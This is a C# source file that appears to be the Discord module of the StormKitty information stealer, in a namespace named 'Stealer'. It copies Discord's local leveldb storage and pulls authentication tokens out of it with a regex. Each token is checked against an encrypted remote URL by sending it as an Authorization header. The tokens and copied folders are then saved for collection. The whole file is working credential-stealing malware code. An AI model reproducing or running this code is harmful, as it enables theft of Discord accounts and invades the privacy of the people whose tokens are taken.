using System;
using System.IO;
using System.Net;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using StormKitty;
using StormKitty.Implant;

namespace Stealer
{
    internal sealed class Discord
    {
        private static Regex TokenRegex = new Regex(@"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}");
        private static string[] DiscordDirectories = new string[] {
            "Discord\\Local Storage\\leveldb",
            "Discord PTB\\Local Storage\\leveldb",
            "Discord Canary\\leveldb",
        };

        // Write tokens
        public static void WriteDiscord(string[] lcDicordTokens, string sSavePath)
        {
            if (lcDicordTokens.Length != 0)
            {
                Directory.CreateDirectory(sSavePath);
                Counter.Discord = true;
                try
                {
                    foreach (string token in lcDicordTokens)
                        File.AppendAllText(sSavePath + "\\tokens.txt", token + "\n");
                } catch (Exception ex) { Console.WriteLine(ex); }
            } try
            {
                CopyLevelDb(sSavePath);
            } catch { }
        }

        // Copy leveldb directory
        private static void CopyLevelDb(string sSavePath)
        {
            foreach (string dir in DiscordDirectories)
            {
                string directory = Path.Combine(Paths.appdata, dir);
                string cpdirectory = Path.Combine(sSavePath,
                    new DirectoryInfo(directory).Name);

                if (!Directory.Exists(directory))
                    continue;
                try
                {
                    Filemanager.CopyDirectory(directory, cpdirectory);
                } catch { }
            }
        }

        // Check token
        private static string TokenState(string token)
        {
            try
            {
                using (WebClient http = new WebClient())
                {
                    http.Headers.Add("Authorization", token);
                    string result = http.DownloadString(
                        StringsCrypt.Decrypt(new byte[] { 204, 119, 158, 154, 23, 66, 149, 141, 183, 108, 94, 12, 88, 31, 176, 188, 18, 22, 179, 36, 224, 199, 140, 191, 17, 128, 191, 221, 16, 110, 63, 145, 150, 152, 246, 105, 199, 84, 221, 181, 90, 40, 214, 128, 166, 54, 252, 46, }));
                    return result.Contains("Unauthorized") ? "Token is invalid" : "Token is valid";
                }
            } catch { }
            return "Connection error";
        }

        // Get discord tokens
        public static string[] GetTokens()
        {
            List<string> tokens = new List<string>();
            try
            {
                foreach (string dir in DiscordDirectories)
                {
                    string directory = Path.Combine(Paths.appdata, dir);
                    string cpdirectory = Path.Combine(Path.GetTempPath(), new DirectoryInfo(directory).Name);

                    if (!Directory.Exists(directory))
                        continue;

                    Filemanager.CopyDirectory(directory, cpdirectory);

                    foreach (string file in Directory.GetFiles(cpdirectory))
                    {
                        if (!file.EndsWith(".log") && !file.EndsWith(".ldb"))
                            continue;

                        string text = File.ReadAllText(file);
                        Match match = TokenRegex.Match(text);
                        if (match.Success)
                            tokens.Add($"{match.Value} - {TokenState(match.Value)}");
                    }

                    Filemanager.RecursiveDelete(cpdirectory);

                }
            }
            catch (Exception ex) { Console.WriteLine(ex); }
            return tokens.ToArray();
        }

    }
}
